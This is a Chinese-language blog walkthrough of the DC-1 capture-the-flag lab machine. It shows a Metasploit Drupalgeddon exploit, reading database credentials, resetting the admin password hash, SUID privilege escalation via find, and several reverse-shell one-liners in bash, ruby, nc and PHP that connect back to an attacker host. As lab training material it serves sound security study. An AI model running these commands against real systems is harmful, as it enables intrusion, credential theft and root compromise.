---
 title: DC-1靶机渗透实战
 date: 2020-02-04 14:01:14
 tags: 靶机渗透
 categories: 靶机渗透
---

### 靶机介绍

这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。
靶机下载地址:http://www.five86.com/dc-1.html

### 信息搜集
直接上nmap进行扫描
![2020-2-4-14-8-49](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-14-8-49)

**可知开放22、80、110端口，linux主机 web可能为Drupal版本号为7**

<!--more-->

### 渗透实战
1. 直接msf查询该cms模块
```
msf5 exploit(multi/http/drupal_drupageddon) > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```
2. 使用第2个expolit获取shell
```
msf5 exploit(multi/http/drupal_drupageddon) > show options 

Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.0.2       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.0.10      yes       The listen address (an interface may be specified)
   LPORT  4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
```
3. 查看本地文件目录发现flag1
```
meterpreter > sysinfo 
Computer    : DC-1
OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
Meterpreter : php/linux
meterpreter > ls
Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  174    fil   2013-11-21 04:45:59 +0800  .gitignore
100644/rw-r--r--  5767   fil   2013-11-21 04:45:59 +0800  .htaccess
100644/rw-r--r--  0      fil   2020-01-21 03:52:58 +0800  1.txt
100644/rw-r--r--  1481   fil   2013-11-21 04:45:59 +0800  COPYRIGHT.txt
100644/rw-r--r--  1451   fil   2013-11-21 04:45:59 +0800  INSTALL.mysql.txt
100644/rw-r--r--  1874   fil   2013-11-21 04:45:59 +0800  INSTALL.pgsql.txt
100644/rw-r--r--  1298   fil   2013-11-21 04:45:59 +0800  INSTALL.sqlite.txt
100644/rw-r--r--  17861  fil   2013-11-21 04:45:59 +0800  INSTALL.txt
100755/rwxr-xr-x  18092  fil   2013-11-01 18:14:15 +0800  LICENSE.txt
100644/rw-r--r--  8191   fil   2013-11-21 04:45:59 +0800  MAINTAINERS.txt
100644/rw-r--r--  5376   fil   2013-11-21 04:45:59 +0800  README.txt
100644/rw-r--r--  9642   fil   2013-11-21 04:45:59 +0800  UPGRADE.txt
100644/rw-r--r--  6604   fil   2013-11-21 04:45:59 +0800  authorize.php
100644/rw-r--r--  720    fil   2013-11-21 04:45:59 +0800  cron.php
100644/rw-r--r--  52     fil   2019-02-19 21:20:46 +0800  flag1.txt
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  includes
100644/rw-r--r--  529    fil   2013-11-21 04:45:59 +0800  index.php
100644/rw-r--r--  703    fil   2013-11-21 04:45:59 +0800  install.php
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  misc
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  modules
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  profiles
100644/rw-r--r--  1561   fil   2013-11-21 04:45:59 +0800  robots.txt
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  scripts
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  sites
40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  themes
100644/rw-r--r--  19941  fil   2013-11-21 04:45:59 +0800  update.php
100644/rw-r--r--  2178   fil   2013-11-21 04:45:59 +0800  web.config
100644/rw-r--r--  417    fil   2013-11-21 04:45:59 +0800  xmlrpc.php
```
> meterpreter > cat flag1.txt

`flag1.txt`
```
Every good CMS needs a config file - and so do you
# 提示查看配置文件
```
4. 查找配置文件为site/setting.php,并连接本地mysql数据库
```
meterpreter > cat settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
- 切换到shell连接mysql,发现不能回显,无法进入交互界面
> mysql -udbuser -pR0ck3t

- 用bash回弹一个shell
* 本地监听2222端口
> nc -lvp 2222
* 反弹bash,获取到一个可以交互的shell
> python -c "import pty;pty.spawn('/bin/bash')" # 获取一个交互shell
> bash -i >& /dev/tcp/172.16.0.10/2222 0>&1 # 反弹bash

5. 查看网站用户账号密码,发现密码经过加密
> select * from users \G;
```
mysql> select * from users \G;
select * from users \G;
*************************** 1. row ***************************
             uid: 0
            name: 
            pass: 
            mail: 
           theme: 
       signature: 
signature_format: NULL
         created: 0
          access: 0
           login: 0
          status: 0
        timezone: NULL
        language: 
         picture: 0
            init: 
            data: NULL
*************************** 2. row ***************************
             uid: 1
            name: admin
            pass: $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
            mail: admin@example.com
           theme: 
       signature: 
signature_format: NULL
         created: 1550581826
          access: 1550583852
           login: 1550582362
          status: 1
        timezone: Australia/Melbourne
        language: 
         picture: 0
            init: admin@example.com
            data: b:0;
*************************** 3. row ***************************
             uid: 2
            name: Fred
            pass: $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
            mail: fred@example.org
           theme: 
       signature: 
signature_format: filtered_html
         created: 1550581952
          access: 1550582225
           login: 1550582225
          status: 1
        timezone: Australia/Melbourne
        language: 
         picture: 0
            init: fred@example.org
            data: b:0;
3 rows in set (0.00 sec)

```
6. 根据提示需要进入后台，那直接把admin密码改掉
- 直接根据网站本地脚本对设置的密码进行加密
> php scripts/password-hash.sh 123456

```
php scripts/password-hash.sh 123456

password: 123456                hash: $S$DqoimnZKpzNbUFgNiiGexSM.Z29/UXOFtPunnZY0nSHhJBi3RdNP

www-data@DC-1:/var/www$
```
- 将加密的密码更新到数据库中
```
mysql -udbuser -pR0ck3t
use drupaldb;
update users set pass='$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu' where uid=1;
select * from users\G;
```
7. 通过robots.txt知道登录地址，通过admin登录成功查看flag3
- 使用设置好的密码：123456，登陆admin账户，在content页面发现了flag3
![2020-2-4-16-11-27](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-16-11-27)

- 提示我们特殊的权限权限有助于发现隐藏内容，这里提到了shadow这个单词，于是立即想到/etc/passwd，先打开看看再说

8. 查看用户发现flag4用户
```
cat /etc/passwd
shell输出
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```
- 直接打开flag4.txt,提示要进入root目录
```
www-data@DC-1:/var/www $ cd /home
www-data@DC-1:/home $ ls
flag4
www-data@DC-1:/home $ cd flag4
www-data@DC-1:/home/flag4 $ 
www-data@DC-1:/home/flag4 $ ls
flag4.txt
www-data@DC-1:/home/flag4 $ cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```
9. 查看权限文件，发现可以通过find命令suid提权
- 可使用提权辅助脚本
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
- 或者直接查看权限命令
> find / -perm -u=s -type f 2>/dev/null
> find / -perm /4000 2>/dev/null

```
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```
- find命令suid提权
> touch test # 创建一个空文件
> find test -exec 'whoami' \; #查看是否提权
> find test -exec '/bin/sh' \;#将root的bash反弹
```
cd root
ls
thefinalflag.txt
cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU
```
至此获得所有的flag
### 总结 
* 反弹bash的不同脚本命令
```
python: python -c "import pty;pty.spawn('/bin/bash')"
ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
nc: nc -e /bin/bash ip port
php:<?php
$sock=fsockopen("ip",port);//自己的外网ip，端口任意
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
* SUID提权
> find test -exec '/bin/sh' \;